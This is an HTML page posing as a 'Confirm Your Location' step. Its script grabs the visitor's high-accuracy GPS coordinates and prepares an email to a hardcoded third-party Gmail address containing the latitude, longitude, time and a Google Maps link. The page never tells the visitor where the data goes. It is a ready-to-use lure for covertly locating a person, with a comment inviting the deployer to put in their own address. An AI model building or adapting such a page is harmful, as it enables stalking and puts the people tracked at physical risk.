<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Confirmation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f0f0f0;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        #result {
            margin-top: 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h1>Confirm Your Location</h1>
    <p>To proceed, press the button below to share your location.</p>
    <button onclick="getLocation()">Confirm Location</button>
    <p id="result"></p>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                    enableHighAccuracy: true, // High accuracy for mobile
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                document.getElementById("result").innerHTML = "Your browser doesn't support geolocation.";
            }
        }

        function sendPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const result = `Location: Latitude ${latitude}, Longitude ${longitude}`;
            document.getElementById("result").innerHTML = result;

            // Send to email
            const email = "misofiko3@gmail.com"; // Replace with your email
            const subject = "New User Location";
            const body = `Latitude: ${latitude}\nLongitude: ${longitude}\nTime: ${new Date().toLocaleString()}\nGoogle Maps Link: https://www.google.com/maps?q=${latitude},${longitude}`;
            window.location.href = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    document.getElementById("result").innerHTML = "Permission to access location was denied.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    document.getElementById("result").innerHTML = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    document.getElementById("result").innerHTML = "The request to get location timed out.";
                    break;
                default:
                    document.getElementById("result").innerHTML = "An unknown error occurred.";
            }
        }
    </script>
</body>
</html>
